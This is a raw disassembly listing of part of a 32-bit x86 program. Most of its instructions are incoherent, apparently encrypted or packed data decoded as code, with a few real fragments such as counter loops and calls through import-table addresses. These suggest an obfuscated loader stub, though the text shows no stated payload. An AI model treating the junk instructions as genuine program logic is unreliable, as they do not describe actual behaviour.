  403faa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403fab:	dec    ebp
  403fac:	adc    al,0xec
  403fae:	inc    esi
  403faf:	xor    BYTE PTR [esi-0x4906aab6],dl
  403fb5:	imul   edi,ebp,0xffffff9f
  403fb8:	jp     0x403fcc
  403fba:	(bad)  
  403fbc:	repnz ds dec eax
  403fbf:	fstp   QWORD PTR [ecx+eiz*2]
  403fc2:	into   
  403fc3:	sub    dl,BYTE PTR [ebp+ebp*1-0x1d]
  403fc7:	cli    
  403fc8:	jno    0x403fb1
  403fca:	sub    BYTE PTR ds:0x5839eeb3,al
  403fd0:	mov    ds:0x4f8c14ba,al
  403fd5:	das    
  403fd6:	dec    ax
  403fd8:	mov    bh,0x99
  403fda:	pop    ecx
  403fdb:	jge    0x40403b
  403fdd:	and    BYTE PTR [ebx+0x2],cl
  403fe0:	mov    ebp,?
  403fe2:	sub    ch,BYTE PTR ds:0xd3a31a65
  403fe8:	pop    ebp
  403fe9:	add    cl,BYTE PTR [ecx+0x120d6a1d]
  403fef:	std    
  403ff0:	dec    esp
  403ff1:	inc    ecx
  403ff2:	call   0x37a1:0x5ad48ba0
  403ff9:	add    dh,BYTE PTR [esi-0x6a]
  403ffc:	xchg   edi,eax
  403ffd:	jbe    0x404009
  403fff:	in     al,dx
  404000:	jl     0x403fa8
  404002:	test   eax,ebp
  404004:	push   ecx
  404005:	inc    eax
  404006:	adc    eax,0x13e276b3
  40400b:	push   ecx
  40400c:	adc    BYTE PTR [eax+0x5a5f8b7c],ch
  404012:	jo     0x403f97
  404014:	in     al,dx
  404015:	(bad)  
  404016:	dec    ebx
  404017:	fwait
  404018:	dec    ecx
  404019:	int    0x31
  40401b:	out    dx,eax
  40401c:	xchg   edx,eax
  40401d:	mov    edi,0x639aa0d8
  404022:	push   ebx
  404023:	mov    cl,0x5a
  404025:	adc    bl,BYTE PTR [ebx]
  404027:	mov    WORD PTR [ecx],ss
  404029:	cmp    bh,BYTE PTR [ebx]
  40402b:	inc    eax
  40402c:	or     BYTE PTR [ebx+0x6519fed1],al
  404032:	aam    0x10
  404034:	es in  eax,dx
  404036:	aaa    
  404037:	popa   
  404038:	or     esp,DWORD PTR [edx+0x71]
  40403b:	push   DWORD PTR fs:[ebp-0x74f33260]
  404042:	mov    DWORD PTR [edi-0x757aa158],esi
  404048:	inc    ebx
  404049:	or     eax,0x1f5d3bb5
  40404e:	test   bl,dl
  404050:	mul    BYTE PTR [ebx+0x0]
  404053:	push   edi
  404054:	lods   eax,DWORD PTR ds:[esi]
  404055:	mov    ebx,0xde75968d
  40405a:	int    0x1a
  40405c:	adc    eax,0x3e2060ff
  404061:	lea    esi,[ecx+edi*4-0x2b]
  404065:	sbb    eax,0x1e22e00c
  40406a:	mov    ebp,0xccc50e5e
  40406f:	sub    ah,0xad
  404072:	xchg   esi,eax
  404073:	jo     0x404060
  404075:	cmp    eax,DWORD PTR [ebx+0x60]
  404078:	inc    esi
  404079:	popa   
  40407a:	add    esi,edx
  40407c:	int3   
  40407d:	pop    ecx
  40407e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40407f:	sub    al,BYTE PTR [eax]
  404081:	out    dx,al
  404082:	aad    0x47
  404084:	mov    WORD PTR [ebx-0x17],?
  404087:	push   esp
  404088:	inc    eax
  404089:	je     0x4040e2
  40408b:	aas    
  40408c:	sbb    al,0xa
  40408e:	fwait
  40408f:	xor    al,0x6c
  404091:	push   esi
  404092:	mov    fs,ebx
  404094:	scas   eax,DWORD PTR es:[edi]
  404095:	add    dl,ah
  404097:	pop    eax
  404098:	std    
  404099:	lds    ebx,FWORD PTR [edx]
  40409b:	push   ebx
  40409c:	lahf   
  40409d:	jnp    0x40404d
  40409f:	(bad)  
  4040a0:	out    0x25,eax
  4040a2:	pop    es
  4040a3:	mov    ch,0xce
  4040a5:	test   eax,0xf4b73131
  4040aa:	addr16 or bh,0x1e
  4040ae:	jbe    0x40406a
  4040b0:	and    edi,eax
  4040b2:	fdivr  DWORD PTR ds:0x598f7b29
  4040b8:	sub    dh,BYTE PTR [eax-0x2]
  4040bb:	xchg   ebp,eax
  4040bc:	ins    BYTE PTR es:[edi],dx
  4040bd:	xor    DWORD PTR [ebp-0xc],0x5fd8e
  4040c4:	jmp    0x404380
  4040c9:	mov    eax,DWORD PTR [ebp-0x8]
  4040cc:	mov    ecx,DWORD PTR [ebp-0x18]
  4040cf:	mov    ecx,DWORD PTR [ecx]
  4040d1:	jmp    0x404370
  4040d6:	aas    
  4040d7:	leave  
  4040d8:	enter  0xdac9,0xd9
  4040dc:	fxch   st(1)
  4040de:	mov    eax,0x9ef7e6c1
  4040e3:	xchg   ebp,eax
  4040e4:	jne    0x4040d5
  4040e6:	sahf   
  4040e7:	es js  0x404162
  4040ea:	(bad)  
  4040eb:	jle    0x404165
  4040ed:	js     0x404074
  4040ef:	push   esi
  4040f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040f1:	or     eax,0xce350a61
  4040f6:	sbb    BYTE PTR ds:0xb2677839,al
  4040fc:	(bad)  
  4040fd:	pop    ecx
  4040fe:	cmp    eax,DWORD PTR [edi+0x340a4e0e]
  404104:	cdq    
  404105:	mov    edi,0x5997706c
  40410a:	test   al,0x9
  40410c:	sub    al,0x64
  40410e:	(bad)  
  404110:	scas   eax,DWORD PTR es:[edi]
  404111:	out    0xed,al
  404113:	xor    al,0x2c
  404115:	rcr    DWORD PTR [ebx+0x308b353b],cl
  40411b:	mov    WORD PTR [edx],ds
  40411d:	push   ebp
  40411e:	outs   dx,DWORD PTR ds:[esi]
  40411f:	sub    cl,al
  404121:	jp     0x4041a0
  404123:	xor    eax,0x96160af2
  404128:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404129:	adc    al,0xe4
  40412b:	mov    al,ds:0xc3cea747
  404130:	cmp    BYTE PTR [edx],ch
  404132:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404133:	mov    bl,0x9c
  404135:	int3   
  404136:	mov    dh,0x9d
  404138:	adc    ecx,esi
  40413a:	daa    
  40413b:	xor    esi,DWORD PTR [ebx]
  40413d:	sub    al,0x60
  40413f:	xor    DWORD PTR [ecx+0x62da6a4e],ebx
  404145:	xchg   DWORD PTR [edi+0x6e44013],esp
  40414b:	lea    esp,[esi+esi*1]
  40414e:	out    dx,al
  40414f:	clc    
  404150:	call   0x2ec0bf9
  404155:	push   ecx
  404156:	pop    ds
  404157:	add    eax,0x69cc5b4e
  40415c:	mov    esp,0xdac9c186
  404161:	cdq    
  404162:	(bad)
  404165:	jmp    0x7443fd88
  40416a:	call   0x7e81:0x1dcc81b5
  404171:	int    0x7d
  404173:	jno    0x40418f
  404175:	cmp    eax,0xd3dfa9ad
  40417a:	mov    dl,al
  40417c:	sbb    BYTE PTR [ebx],bh
  40417e:	cld    
  40417f:	add    dl,BYTE PTR [eax+0x58737826]
  404185:	jmp    0xd39a:0x779b8e69
  40418c:	mov    bl,0xb9
  40418e:	or     al,0x6b
  404190:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404191:	repnz test eax,0xd3a9c2b
  404197:	fnstenv [esp+eiz*2]
  40419a:	in     eax,dx
  40419b:	in     eax,dx
  40419c:	dec    DWORD PTR [ebx]
  40419e:	je     0x4041b9
  4041a0:	and    DWORD PTR ds:0xbc73e000,0x26a0e8b8
  4041aa:	loope  0x404146
  4041ac:	dec    edx
  4041ad:	test   bh,ch
  4041af:	sub    BYTE PTR [eax+0x29db118e],bh
  4041b5:	inc    edi
  4041b6:	mov    ah,0x1
  4041b8:	in     eax,0x7b
  4041ba:	fmul   DWORD PTR [edi]
  4041bc:	add    ecx,DWORD PTR [edi-0x2d]
  4041bf:	push   eax
  4041c0:	out    0xfd,eax
  4041c2:	fnstcw WORD PTR [edi+0x4d]
  4041c5:	mov    ebp,0xdaa960e7
  4041ca:	loop   0x404221
  4041cc:	jge    0x404192
  4041ce:	jbe    0x404160
  4041d0:	mov    ebp,0x6baf3f4d
  4041d5:	inc    ecx
  4041d6:	xchg   DWORD PTR [esp+eax*8-0x765b7f5a],ecx
  4041dd:	pop    esp
  4041de:	fnstsw WORD PTR [esi-0x7c]
  4041e1:	cdq    
  4041e2:	ret    
  4041e3:	sti    
  4041e4:	aas    
  4041e5:	fiadd  DWORD PTR [eax+edx*1-0xf]
  4041e9:	fcomp  DWORD PTR [ebx-0x14d71b3e]
  4041ef:	or     BYTE PTR [ecx],0xca
  4041f2:	mov    eax,0x997ea844
  4041f7:	lock dec esi
  4041f9:	mov    WORD PTR [edi],es
  4041fb:	sbb    BYTE PTR [edi-0x278fa9dc],dl
  404201:	repnz mov ds:0x5a324842,al
  404207:	enter  0xf07d,0x1c
  40420b:	mov    bh,0x2e
  40420d:	nop
  40420e:	scas   eax,DWORD PTR es:[edi]
  40420f:	push   ebp
  404210:	out    0x3a,eax
  404212:	mov    dl,0xb1
  404214:	jl     0x4041c9
  404216:	inc    edx
  404217:	mov    ds,WORD PTR [edx+ebx*8+0x7c]
  40421b:	xchg   edi,eax
  40421c:	add    DWORD PTR [edi-0x7b2b16b5],0xbb66f546
  404226:	ins    BYTE PTR es:[edi],dx
  404227:	xchg   ecx,eax
  404228:	sbb    al,0x38
  40422a:	out    0xd3,eax
  40422c:	or     eax,0x4e895d50
  404231:	aas    
  404232:	sub    edx,edx
  404234:	sub    DWORD PTR [ebx],edi
  404236:	xchg   ebx,eax
  404237:	add    eax,0x8d475644
  40423c:	pop    ecx
  40423d:	xchg   esp,eax
  40423e:	test   DWORD PTR [ebx],0x2c6bab6c
  404244:	test   ah,0xde
  404247:	mov    ds:0x6391279c,al
  40424c:	pop    edi
  40424d:	fst    QWORD PTR [eax]
  40424f:	fld    DWORD PTR [edx-0x1d4ed0df]
  404255:	aad    0x12
  404257:	jns    0x4042b3
  404259:	push   ebx
  40425a:	push   0x6e6f68f0
  40425f:	mov    WORD PTR [ebx+ecx*4],?
  404262:	or     edx,DWORD PTR [edx+eax*8]
  404265:	pop    ebx
  404266:	adc    eax,0xe8f62d53
  40426b:	xor    dh,BYTE PTR [ebp+ecx*4-0xd451507]
  404272:	push   cs
  404273:	mov    al,ds:0x40d2aa17
  404278:	std    
  404279:	cmp    BYTE PTR [edx],dl
  40427b:	and    eax,DWORD PTR [eax+0x1a5c2dbb]
  404281:	jmp    0xf1a6:0xdf756e93
  404288:	cmp    BYTE PTR [esp+ebp*1-0xd],ch
  40428c:	or     BYTE PTR [edi],0x3f
  40428f:	sub    ch,BYTE PTR [esi]
  404291:	jne    0x40424f
  404293:	pushf  
  404294:	xchg   ebp,eax
  404295:	and    eax,0xb7c2f3dd
  40429a:	add    BYTE PTR [ebp-0x66],ah
  40429d:	mov    bh,0x6f
  40429f:	fist   DWORD PTR [edx]
  4042a1:	adc    al,BYTE PTR [edx]
  4042a3:	inc    eax
  4042a4:	pop    ss
  4042a5:	outs   dx,BYTE PTR ds:[esi]
  4042a6:	add    bl,dh
  4042a8:	scas   al,BYTE PTR es:[edi]
  4042a9:	and    esp,0xe8b4860c
  4042af:	outs   dx,DWORD PTR ds:[esi]
  4042b0:	mov    dl,0x5c
  4042b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042b3:	or     ecx,ecx
  4042b5:	in     al,dx
  4042b6:	leave  
  4042b7:	aas    
  4042b8:	cmp    eax,0x111f4d0f
  4042bd:	xchg   esp,eax
  4042be:	sti    
  4042bf:	cmp    al,0x38
  4042c1:	out    dx,al
  4042c2:	jmp    0x92927278
  4042c7:	loope  0x404319
  4042c9:	jns    0x404340
  4042cb:	es js  0x40425e
  4042ce:	dec    edi
  4042cf:	inc    ebp
  4042d0:	loop   0x4042ad
  4042d2:	xchg   DWORD PTR [ecx],edx
  4042d4:	jl     0x404292
  4042d6:	mov    esp,0x9de72729
  4042db:	daa    
  4042dc:	idiv   BYTE PTR [ecx+0x42]
  4042df:	mov    al,ds:0xfc13f13a
  4042e4:	cmp    al,0x6a
  4042e6:	cmp    al,0x9b
  4042e8:	inc    esp
  4042e9:	stos   DWORD PTR es:[edi],eax
  4042ea:	sub    ah,bl
  4042ec:	xchg   ebp,ecx
  4042ee:	fdivr  st,st(4)
  4042f0:	sub    esi,DWORD PTR [ebp+0x3d6ec375]
  4042f6:	pop    ebx
  4042f7:	call   0x58c2a032
  4042fc:	adc    cl,cl
  4042fe:	nop
  4042ff:	les    edi,FWORD PTR [esi-0x73e56636]
  404305:	dec    eax
  404306:	xor    edx,ebp
  404308:	aas    
  404309:	pop    ebp
  40430a:	stc    
  40430b:	fidiv  WORD PTR [ebp-0x27]
  40430e:	pop    ecx
  40430f:	cmp    BYTE PTR [ebx],cl
  404311:	push   ebx
  404312:	int    0xf7
  404314:	outs   dx,BYTE PTR ds:[esi]
  404315:	or     al,0x53
  404317:	sti    
  404318:	and    al,0xe9
  40431a:	stos   DWORD PTR es:[edi],eax
  40431b:	retf   
  40431c:	mov    bh,0x1d
  40431e:	push   cs
  40431f:	leave  
  404320:	mov    ds:0x11057f7f,al
  404325:	retf   0x22f7
  404328:	pop    ecx
  404329:	lods   al,BYTE PTR ds:[esi]
  40432a:	xor    ah,0x6b
  40432d:	inc    edi
  40432e:	je     0x4043a4
  404330:	stos   BYTE PTR es:[edi],al
  404331:	mov    bl,0xb1
  404333:	aad    0x38
  404335:	xor    DWORD PTR [ebx+0x38],edx
  404338:	pop    ss
  404339:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40433a:	mov    ch,0xe9
  40433c:	xchg   edi,eax
  40433d:	push   0x1c1174fe
  404342:	mov    dh,0xac
  404344:	cli    
  404345:	inc    edx
  404346:	inc    esi
  404347:	(bad)  
  404348:	shufps xmm7,XMMWORD PTR [esi+0x2613708b],0xc1
  404350:	stos   BYTE PTR es:[edi],al
  404351:	sbb    ch,ah
  404353:	and    BYTE PTR [edx+esi*1-0xd59d298],dh
  40435a:	pop    esi
  40435b:	data16 lahf 
  40435d:	push   0xeeda5ae5
  404362:	mov    al,0x46
  404364:	jmp    0x8439cd7c
  404369:	cdq    
  40436a:	adc    al,0xd7
  40436c:	in     al,dx
  40436d:	push   edx
  40436e:	scas   al,BYTE PTR es:[edi]
  40436f:	dec    edi
  404370:	mov    DWORD PTR [eax],ecx
  404372:	mov    eax,DWORD PTR [ebp+0xc]
  404375:	mov    eax,DWORD PTR [ebp+0x8]
  404378:	push   DWORD PTR [ebp-0x8]
  40437b:	call   0x4096cf
  404380:	mov    eax,DWORD PTR [ebp-0xc]
  404383:	cmp    eax,ebx
  404385:	je     0x401faa
  40438b:	mov    eax,DWORD PTR [ebp-0x8]
  40438e:	mov    eax,DWORD PTR [eax]
  404390:	pop    edi
  404391:	pop    esi
  404392:	pop    ebx
  404393:	leave  
  404394:	ret    0xc
  404397:	push   ebp
  404398:	mov    ebp,esp
  40439a:	sub    esp,0x14
  40439d:	leave  
  40439e:	ret    0x4
  4043a1:	push   ebp
  4043a2:	mov    ebp,esp
  4043a4:	push   ecx
  4043a5:	mov    eax,ds:0x42a77d
  4043aa:	add    DWORD PTR ds:0x42a761,eax
  4043b0:	push   ecx
  4043b1:	xor    ecx,0x7913
  4043b7:	mov    eax,0xf89c8538
  4043bc:	and    DWORD PTR ds:0x42a7b5,0x0
  4043c6:	mov    ecx,DWORD PTR ds:0x42a7b5
  4043cc:	inc    ecx
  4043cd:	mov    DWORD PTR ds:0x42a7b5,ecx
  4043d3:	cmp    DWORD PTR ds:0x42a7b5,0x23
  4043da:	jne    0x4043e6
  4043e0:	call   DWORD PTR ds:0x41d240
  4043e6:	cmp    DWORD PTR ds:0x42a7b5,0x15
  4043ed:	jb     0x4043c6
  4043f3:	mov    DWORD PTR [ebp-0x8],eax
  4043f6:	dec    DWORD PTR ds:0x42a845
  4043fc:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  404403:	mov    edx,DWORD PTR [ebp-0x8]
  404406:	not    ecx
  404408:	jmp    0x4046f8
  40440d:	rol    edi,0x3f
  404410:	retf   
  404411:	leave  
  404412:	retf   
  404413:	leave  
  404414:	lds    edx,FWORD PTR [edx]
  404416:	dec    esp
  404417:	inc    ecx
  404418:	ins    BYTE PTR es:[edi],dx
  404419:	xor    cl,BYTE PTR [edi-0x50]
  40441c:	dec    esi
  40441d:	sbb    al,0x2b
  40441f:	js     0x404499
  404421:	dec    ebp
  404422:	jle    0x40449c
  404424:	js     0x404429
  404426:	ins    BYTE PTR es:[edi],dx
  404427:	mov    ebx,0xb5241dfc
  40442c:	cld    
  40442d:	mov    ds:0xd2a1493c,eax
  404432:	cmp    al,0x46
  404434:	idiv   al
  404436:	or     al,0xe3
  404438:	stos   DWORD PTR es:[edi],eax
  404439:	cmp    ecx,DWORD PTR [edi+0x9]
  40443c:	rcl    esi,cl
  40443e:	xchg   esi,eax
  40443f:	test   ax,0x6dd5
  404443:	add    esi,esi
  404445:	push   cs
  404446:	adc    ebp,DWORD PTR [edx-0x2f844330]
  40444c:	dec    eax
  40444d:	and    eax,0xa15cf420
  404452:	in     al,dx
  404453:	add    al,0x40
  404455:	xchg   edi,eax
  404456:	lea    esp,[esi-0x300cae41]
  40445c:	pop    ds
  40445d:	jb     0x4044ae
  40445f:	retf   0x53bd
  404462:	in     eax,0x9d
  404464:	popf   
  404465:	sub    DWORD PTR [edi-0x21e700e5],ecx
  40446b:	dec    edx
  40446c:	pushf  
  40446d:	push   ebp
  40446e:	test   al,0x2d
  404470:	js     0x40444f
  404472:	xor    DWORD PTR [ebx+0x564427b8],eax
  404478:	stos   BYTE PTR es:[edi],al
  404479:	mov    bl,0x40
  40447b:	iret   
  40447c:	mov    BYTE PTR [ebx+0x5e146c0f],bl
  404482:	in     eax,0xb0
  404484:	xchg   eax,eax
  404486:	fld1   
  404488:	mov    esi,0x8f5c364b
  40448d:	xor    edx,DWORD PTR [eax]
  40448f:	cwde   
  404490:	stc    
  404491:	xor    al,ah
  404493:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404494:	jge    0x404444
  404496:	xchg   ebp,eax
  404497:	fcmovu st,st(1)
  404499:	out    0xe8,al
  40449b:	mov    ebp,0xdee04c50
  4044a0:	mov    BYTE PTR [edx-0x4143352d],ah
  4044a6:	push   esi
  4044a7:	jno    0x40447b
  4044a9:	jecxz  0x4044f4
  4044ab:	sub    al,0x31
  4044ad:	aaa    
  4044ae:	cmp    BYTE PTR [eax+edi*8-0x26],dl
  4044b2:	gs lahf 
  4044b4:	stos   BYTE PTR es:[edi],al
  4044b5:	pop    ss
  4044b6:	adc    al,0xd5
  4044b8:	imul   eax,edi,0x7d
  4044bb:	cdq    
  4044bc:	lods   eax,DWORD PTR ds:[esi]
  4044bd:	jns    0x404450
  4044bf:	and    edi,edi
  4044c1:	sar    BYTE PTR [ebx-0x35],cl
  4044c4:	stc    
  4044c5:	loope  0x404479
  4044c7:	lock xor bl,dh
  4044ca:	adc    bh,BYTE PTR [ecx+0xe]
  4044cd:	push   cs
  4044ce:	mov    bl,0xee
  4044d0:	fdivr  DWORD PTR [edi]
  4044d2:	stos   DWORD PTR es:[edi],eax
  4044d3:	imul   eax,DWORD PTR [ebx+0x59],0xffffffa6
  4044d7:	or     ecx,DWORD PTR [esi]
  4044d9:	sub    BYTE PTR [edi+ecx*8],dl
  4044dc:	inc    edi
  4044dd:	and    edi,ebp
  4044df:	pop    edi
  4044e0:	jp     0x404500
  4044e2:	jp     0x404476
  4044e4:	fstp   QWORD PTR [ecx+0xb]
  4044e7:	mov    gs,WORD PTR [edi+0xa]
  4044ea:	dec    eax
  4044eb:	js     0x404544
  4044ed:	inc    esi
  4044ee:	sub    eax,0xdf117245
  4044f3:	cmp    BYTE PTR [eax+0x1391ad3d],0x3
  4044fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044fb:	cmp    cl,BYTE PTR [ecx+0x1a0e8e36]
  404501:	adc    ebx,ebp
  404503:	imul   ebx,DWORD PTR [eax],0x1a109b02
  404509:	imul   cx,WORD PTR [edi+0x582292df],0xff99
  404511:	xchg   esp,eax
  404512:	retf   
  404513:	fsub   QWORD PTR [edx]
  404515:	xchg   ebp,eax
  404516:	adc    BYTE PTR [edi-0xe],dh
  404519:	xchg   esp,eax
  40451a:	pop    es
  40451b:	xchg   ecx,eax
  40451c:	icebp  
  40451d:	mov    edx,0xdc66dde5
  404522:	lds    ebp,FWORD PTR [eax-0x28]
  404525:	pusha  
  404526:	ins    BYTE PTR es:[edi],dx
  404527:	adc    BYTE PTR [ebx+0x373b2553],cl
  40452d:	mov    bh,0x46
  40452f:	or     eax,DWORD PTR [edx-0x22]
  404532:	gs dec esi
  404534:	xor    edx,ebx
  404536:	adc    DWORD PTR [esi+0x4f],edx
  404539:	push   ds
  40453a:	sub    eax,0x7f6338f0
  40453f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404540:	cdq    
  404541:	add    ah,BYTE PTR [esi-0x2ae7116a]
  404547:	int3   
  404548:	icebp  
  404549:	ds adc eax,0x67f11d07
  40454f:	lods   eax,DWORD PTR ds:[esi]
  404550:	lock sub ebx,DWORD PTR [edx-0x1e863cd8]
  404557:	lock fidiv DWORD PTR [ebx]
  40455a:	repnz idiv BYTE PTR [ebx+0x42c0b3a5]
  404561:	sbb    DWORD PTR [ecx+0x66],ebp
  404564:	lahf   
  404565:	adc    DWORD PTR [edi+edi*1],eax
  404568:	out    0xef,al
  40456a:	dec    edx
  40456b:	int    0x7c
  40456d:	in     al,0xb3
  40456f:	jle    0x404531
  404571:	icebp  
  404572:	shl    DWORD PTR [esi+0x41831afc],1
  404578:	xchg   ecx,eax
  404579:	pop    edx
  40457a:	outs   dx,DWORD PTR ds:[esi]
  40457b:	ja     0x40457f
  40457d:	push   ebp
  40457e:	(bad)  
  40457f:	xlat   BYTE PTR ds:[ebx]
  404580:	jmp    0x4802:0x664a8be6
  404587:	inc    edi
  404588:	mov    cs,WORD PTR [ecx]
  40458a:	popa   
  40458b:	into   
  40458c:	dec    esp
  40458d:	push   esi
  40458e:	push   ss
  40458f:	mov    ebp,esp
  404591:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404592:	mov    ?,WORD PTR [ecx-0x67]
  404595:	cs pop ebx
  404597:	pop    eax
  404598:	fadd   st,st(4)
  40459a:	gs iret 
  40459c:	shl    DWORD PTR [edx+0x6e],cl
  40459f:	jge    0x4045be
  4045a1:	pop    edx
  4045a2:	mov    ecx,0xf21969bf
  4045a7:	cdq    
  4045a8:	fdiv   DWORD PTR [esi]
  4045aa:	call   0xf74e21bb
  4045af:	jno    0x404548
  4045b1:	jl     0x75500df5
  4045b7:	sub    BYTE PTR [edx],0xdd
  4045ba:	mov    dh,0x46
  4045bc:	lods   al,BYTE PTR ds:[esi]
  4045bd:	mov    cl,0xd9
  4045bf:	pop    edx
  4045c0:	mov    esi,0x1d92046c
  4045c5:	jns    0x40457b
  4045c7:	inc    ebx
  4045c8:	adc    eax,0xa165fa6a
  4045cd:	daa    
  4045ce:	sub    DWORD PTR [esi+ebx*4+0xf],ebp
  4045d2:	pop    es
  4045d3:	mov    ds:0x5b45d210,eax
  4045d8:	jmp    0x2f5e3a7b
  4045dd:	scas   eax,DWORD PTR es:[edi]
  4045de:	xchg   esp,eax
  4045df:	dec    ebp
  4045e0:	push   cs
  4045e1:	sub    BYTE PTR [eax-0x1b96d693],0xa1
  4045e8:	or     al,0xa
  4045ea:	nop
  4045eb:	test   DWORD PTR [eax],ebp
  4045ed:	aas    
  4045ee:	mov    ch,0x66
  4045f0:	fucomip st,st(3)
  4045f2:	jnp    0x4045c4
  4045f4:	icebp  
  4045f5:	mov    ebx,DWORD PTR [ebp-0x158e711f]
  4045fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045fc:	sbb    edi,DWORD PTR [eax]
  4045fe:	xor    al,0xb5
  404600:	outs   dx,DWORD PTR ds:[esi]
  404601:	or     DWORD PTR [edi-0x14],0x9d8ed78f
  404608:	lods   eax,DWORD PTR ds:[esi]
  404609:	xchg   ebx,eax
  40460a:	shl    BYTE PTR ds:0x875f7540,0x3e
  404611:	pop    edi
  404612:	jne    0x4045c1
  404614:	cmp    BYTE PTR ss:[edi-0x6839505],dh
  40461b:	(bad)  
  40461c:	fbstp  TBYTE PTR [ebx]
  40461e:	sub    eax,ebp
  404620:	sbb    edx,DWORD PTR [esi]
  404622:	xor    cl,BYTE PTR [ebx-0xa]
  404625:	and    eax,0xa98e384f
  40462a:	movq   QWORD PTR [esi],mm2
  40462d:	inc    edx
  40462e:	(bad)  
  40462f:	adc    al,0xd3
  404631:	arpl   WORD PTR [edx+0x6e],dx
  404634:	mov    cl,0xa3
  404636:	pop    ss
  404637:	sub    al,0xae
  404639:	outs   dx,BYTE PTR ds:[esi]
  40463a:	dec    ebx
  40463b:	in     al,dx
  40463c:	jb     0x404677
  40463e:	jnp    0x40461b
  404640:	(bad)  
  404642:	repz das 
  404644:	push   0x37873ac2
  404649:	push   ebx
  40464a:	dec    ebx
  40464b:	pusha  
  40464c:	cmp    dl,al
  40464e:	push   edi
  40464f:	je     0x404619
  404651:	mov    dl,0x39
  404653:	jbe    0x404646
  404655:	or     cl,bl
  404657:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404658:	mov    al,0x4a
  40465a:	or     dl,BYTE PTR [ebx-0x4f]
  40465d:	sbb    eax,0x2687ad86
  404662:	xor    BYTE PTR ds:0x10adb989,al
  404668:	pop    esi
  404669:	jecxz  0x4046ce
  40466b:	loope  0x404621
  40466d:	lods   al,BYTE PTR ds:[esi]
  40466e:	mov    ch,0x7b
  404670:	inc    ebx
  404671:	push   ecx
  404672:	mov    esp,0x820a5808
  404677:	add    bl,al
  404679:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40467a:	mov    ebp,0xf95946c7
  40467f:	in     al,0x50
  404681:	clc    
  404682:	enter  0xcd8a,0xe7
  404686:	pop    ss
  404687:	fldenv [edi]
  404689:	xchg   DWORD PTR [ebx+0x45],edx
  40468c:	sub    BYTE PTR [eax-0x6f],dl
  40468f:	mov    bl,0xc8
  404691:	xchg   ebx,eax
  404692:	repz xor al,0xe4
  404695:	add    al,0x85
  404697:	iret   
  404698:	inc    DWORD PTR [edi]
  40469a:	jmp    0xb546:0x2c96a8b5
  4046a1:	ror    BYTE PTR [esi],cl
  4046a3:	and    ch,BYTE PTR [esi-0x1ca75143]
  4046a9:	cmp    al,0x58
  4046ab:	ins    DWORD PTR es:[edi],dx
  4046ac:	sti    
  4046ad:	mov    ds:0x9bc4f2a3,al
  4046b2:	jo     0x404713
  4046b4:	jg     0x40464d
  4046b6:	out    dx,eax
  4046b7:	(bad)  
  4046b8:	dec    eax
  4046b9:	ins    BYTE PTR es:[edi],dx
  4046ba:	inc    ecx
  4046bb:	xchg   esi,eax
  4046bc:	sub    DWORD PTR [ebx+ebp*1-0x3a],edx
  4046c0:	add    ch,BYTE PTR [edx+0x2ad67054]
  4046c6:	dec    eax
  4046c7:	xchg   edi,eax
  4046c8:	jecxz  0x40464d
  4046ca:	fmul   DWORD PTR [ebx+0x5f4c0c06]
  4046d0:	in     eax,dx
  4046d1:	jnp    0x40465f
  4046d3:	adc    eax,0x7d8d1ef8
  4046d8:	sbb    DWORD PTR [edi-0x11],edx
  4046db:	mov    ebx,0xecfdb0c9
  4046e0:	out    dx,al
  4046e1:	or     dh,bh
  4046e3:	test   BYTE PTR [eax-0x1f35266a],dl
  4046e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4046ea:	fadd   DWORD PTR es:[ebx-0x5ddc672d]
  4046f1:	popa   
  4046f2:	pop    esi
  4046f3:	stos   BYTE PTR es:[edi],al
  4046f4:	fcmovbe st,st(4)
  4046f6:	pop    eax
  4046f7:	imul   edx,DWORD PTR [esi-0x7f],0x42a77525
  4046fe:	add    BYTE PTR [eax],al
  404700:	add    BYTE PTR [eax],al
  404702:	add    cl,ch
  404704:	or     eax,0x8b000000
  404709:	xor    eax,0x42a775
  40470e:	inc    esi
  40470f:	mov    DWORD PTR ds:0x42a775,esi
  404715:	cmp    DWORD PTR ds:0x42a775,0x10
  40471c:	jae    0x404a4d
  404722:	cmp    DWORD PTR ds:0x42a775,0x16
  404729:	jne    0x404752
  40472f:	push   DWORD PTR [ebp-0x1c]
  404732:	push   DWORD PTR [ebp-0xc]
  404735:	push   DWORD PTR [ebp-0x18]
  404738:	push   0x42a83d
  40473d:	push   0x2e4d
  404742:	push   0x244d
  404747:	push   0x42aa48
  40474c:	call   DWORD PTR ds:0x41d0c0
  404752:	jmp    0x404708
  404757:	xor    esi,0x7852
  40475d:	jmp    0x404a4d
  404762:	rol    eax,1
  404764:	int3   
  404765:	(bad)  
  404766:	(bad)  
  404768:	(bad)  
  40476a:	pop    esi
  40476b:	test   eax,0x27ed83de
  404770:	add    al,0x6c
  404772:	jno    0x40479d
  404774:	js     0x4047ee
  404776:	dec    ebp
  404777:	jle    0x4047f1
  404779:	js     0x4047a3
  40477b:	and    DWORD PTR [eax+0x26],esi
  40477e:	dec    eax
  40477f:	sub    edi,DWORD PTR [esi+esi*2]
  404782:	mov    ds:0x1dc4d570,eax
  404787:	push   0x213c65c1
  40478c:	jno    0x40480b
  40478e:	adc    esp,DWORD PTR [ebp-0x30f36c1a]
  404794:	(bad)  
  404795:	adc    ebp,DWORD PTR [edx+eiz*2+0x1b]
  404799:	dec    ecx
  40479a:	xchg   edi,eax
  40479b:	adc    bl,BYTE PTR ds:0xa1bbffef
  4047a1:	cmp    bh,al
  4047a3:	xor    eax,0xea247d18
  4047a8:	bound  edx,QWORD PTR [edi+0x61]
